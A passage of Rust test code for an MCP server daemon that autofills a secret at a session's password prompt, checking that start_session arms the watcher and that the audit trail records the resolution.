            client.unregister(&server);
            let _ = s.signal(Signal::Kill);
            let _ = forwarder.await;
        }
        // **Anti-vacuity, and it is load-bearing** — verified by
        // injection: a `take_if_unadopted_matching` that answers `Vacant`
        // without closing leaves every other assertion in the loop green,
        // because they are all blind to whether the autofill ever
        // satisfied the raise.
        //
        // `== PASSES` rather than `> 0`, because the doc above says the
        // two orderings converge: if that is right, every pass closes
        // `fulfilled`, and a run that did not would mean the convergence
        // argument is wrong and should be re-derived rather than tolerated.
        assert_eq!(
            fulfilled, PASSES,
            "the two orderings did not converge on `fulfilled`; the argument in this \
             row's doc needs re-deriving"
        );
    }

    /// **The production wiring**, which none of the rows above touches.
    ///
    /// Every row above arms the listener by hand, so all five would pass
    /// against a daemon in which nothing ever calls
    /// `HoldfastServer::watch_for_autofill` — a feature that works only
    /// when a test sets it up. This row goes through `start_session`,
    /// which is an MCP tool call and is why it is a separate row from
    /// `autofill_injects_when_it_is_enabled` rather than folded into it.
    ///
    /// The gate is opened **after** `start_session` returns, which is what
    /// makes "armed before the edge" a property of the arrangement rather
    /// than of how fast a `fork`/`exec` is on the machine running this.
    #[tokio::test]
    async fn start_session_arms_the_echo_drop_watcher() {
        let mut sc = Scratch::new("startsession");
        // This row's session is `sh -c <script>` rather than an `ssh`, so
        // its whole-line pattern is built from the script the row is about
        // to run — `regex::escape`d, because the script is a shell one-liner
        // full of regex metacharacters and a temporary path. The
        // alternative spelling, `^sh\s+-c\s+.*$`, is the permissive tail
        // `Config::validate` refuses in an operator's config; see
        // [`SSH_PROD`].
        let gate = sc.path("gate");
        let script = gated_echo_off(&gate);
        let pattern = format!("^sh\\s+-c\\s+{}$", regex::escape(&script));
        // Built at run time from a path unique to this row, so it is
        // proved loadable rather than listed (GH #45 M-7). The example is
        // the command line `start_session` is about to be given below.
        assert_fixture_pattern_loads(&pattern, &format!("sh -c {script}"));
        let b = sc.binding("shell", &pattern, &format!("printf '{PROBE}\\n'\n"));
        let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());

        let started = server
            .start_session(Parameters(crate::mcp::tools::StartSessionArgs {
                command: Some("sh".into()),
                args: vec!["-c".into(), script.clone()],
                ..Default::default()
            }))
            .await
            .expect("start_session");
        let id = body(&started)["data"]["session_id"]
            .as_str()
            .expect("a session id")
            .to_string();
        let s = server.registry.get(&id).expect("the session");

        std::fs::write(&gate, b"go").expect("open the gate");
        await_prompt(&s, b"Password: ").await;
        buffer_until(&s, b"got=HUNTER2", 20).await;
        assert!(sc.ran("shell"), "the binding's provider never ran");
        assert!(
            sc.kinds(&s.id).iter().any(|k| k == "binding_resolved"),
            "the trail does not record the resolution: {:?}",
            sc.kinds(&s.id)
        );
        // No secret-related tool call was made, and the trail says so.
        assert!(
            !sc.kinds(&s.id).iter().any(|k| k == "secret_input_request"),
            "a `secret_input_request` was written for a flow with no such call"
        );

        let _ = s.signal(Signal::Kill);
    }
}
